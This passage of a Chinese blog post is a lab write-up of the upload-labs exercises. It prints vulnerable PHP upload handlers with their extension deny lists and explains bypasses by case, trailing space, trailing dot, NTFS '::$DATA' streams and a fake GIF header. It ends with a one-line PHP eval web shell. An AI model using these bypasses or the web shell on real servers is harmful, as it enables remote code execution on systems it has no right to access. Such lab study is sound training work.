class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);   <span class="hljs-comment">//返回.以及以后的部分</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空   首尾去空格，这是为什么捏</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>; <span class="hljs-comment">//ok..这个是给文件换了个随机数名字</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>好，审完了，开始构造payload: 它进行首尾去空格的操作，然后给文件换了个随机数名字，这就算传上去了要怎么访问? 那自然是爆破<br>然后可以看到没有进行大小写转化，于是可以进行绕过</p>
+<p>绕过之后看看upload的文件夹，发现上传成功了，但是名字是随机数，对于这个，可以用burp爆破进行访问，然后找到后用菜刀直连</p>
+<h1 id="page-7-空格后缀绕过"><a href="#page-7-空格后缀绕过" class="headerlink" title="page-7 空格后缀绕过"></a>page-7 空格后缀绕过</h1><p>查看提示，没啥鸟用，于是查看源码: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>没有发现去掉首尾空格的函数，于是我觉得阔以通过空格后缀绕过，事实也果然，burp抓包，在结尾加空格即可<br>….提示上传出错….我服了，这他妈是什么情况??? 查看源码，也找8到问题所在，wdnmd</p>
+<h1 id="page-08-后缀名加点绕过"><a href="#page-08-后缀名加点绕过" class="headerlink" title="page-08 后缀名加点绕过"></a>page-08 后缀名加点绕过</h1><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);   <span class="hljs-comment">//取后缀</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>进行了首尾去空以及转换大小写操作，同时把$DATA也去除了</p>
+<p>但是没有使用delot()去除文件名末尾的点，于是可以抓包，然后在文件后缀结尾处加’.’绕过，上传成功后，win会自动把后缀名中的点去掉</p>
+<h1 id="page-09-DATA绕过"><a href="#page-09-DATA绕过" class="headerlink" title="page-09 ::$DATA绕过"></a>page-09 ::$DATA绕过</h1><p>原理:<br>源代码缺少 $file_ext &#x3D; str_ireplace(‘::$DATA’, ‘’, $file_ext);&#x2F;&#x2F;去除字符串::$DATA限制，可以文件名后缀增加::$DATA绕过</p>
+<p>Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA 时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容(么看懂)</p>
+<p>NTFS文件流实际应用<br>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$DATA<br>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</p>
+<p>解题步骤<br>上传文件名info8.php::$DATA，访问时去除后缀<br>(.phtml文件是指嵌入了php代码的html文件)</p>
+<p>绕过WAF通常用8同形式的编码</p>
+<h1 id="文件幻术头绕过"><a href="#文件幻术头绕过" class="headerlink" title="文件幻术头绕过"></a>文件幻术头绕过</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">GIF89</span>a? <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_REQUEST[<span class="hljs-number">1</span>])</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>  <span class="hljs-comment">//文件幻术头绕过...</span><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E5%9F%BA%E7%A1%80/" class="category-chain-item">基础</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>upload_labs刷题&amp;&amp;文件上传漏洞笔记</div>
+      <div>http://example.com/2022/03/28/upload-labs刷题/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>March 28, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/04/04/http%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/" title="http走私攻击">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">http走私攻击</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/26/%E6%88%98%E6%96%97%E8%AE%B0%E5%BF%86/" title="战斗记忆">
+                        <span class="hidden-mobile">战斗记忆</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
